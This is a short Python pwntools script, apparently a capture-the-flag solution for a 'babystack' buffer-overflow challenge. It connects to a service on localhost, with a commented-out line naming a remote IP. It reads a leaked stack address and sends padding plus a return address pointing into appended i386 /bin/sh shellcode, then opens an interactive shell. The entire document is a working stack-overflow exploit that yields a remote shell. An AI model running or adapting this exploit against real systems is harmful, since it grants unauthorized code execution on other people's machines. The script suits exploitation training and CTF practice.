from pwn import *
#context.log_level = 'debug' 
#p = remote('35.201.255.209',1000)
#p = process('./babystack')
p = remote("127.0.0.1",8000)

#p = remote("127.0.0.1",9998)
#context.log_level = 'debug' 
#p = process("./stack_overflow")
sc = asm(shellcraft.i386.sh())    
temp = int(p.recvline(),16)               
sc_addr = p32(temp + 0x12 + 4 + 4)    
payload = 0x12 * 'a' + 'bbbb' + sc_addr + sc  
p.sendline(payload)
p.interactive()
